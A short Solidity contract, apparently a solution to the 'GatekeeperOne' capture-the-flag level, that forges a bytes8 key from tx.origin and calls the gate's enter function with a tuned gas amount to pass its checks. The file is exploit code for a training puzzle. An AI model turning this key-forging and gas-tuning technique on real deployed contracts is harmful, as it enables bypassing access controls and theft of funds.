// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract Hack {
    IGatekeeperOne gate;

    constructor(address contractAddress) {
        gate = IGatekeeperOne(contractAddress);
    }

    function attack(uint gas) public {
        uint64 value1 = uint64(uint16(uint160(tx.origin)));
        uint64 value = value1 + 1152921504606846976; //value  + 0x1000000000000000
        bytes8 key = bytes8(abi.encodePacked(value));

        gate.enter{gas: 550000 + gas}(key);
    }
}
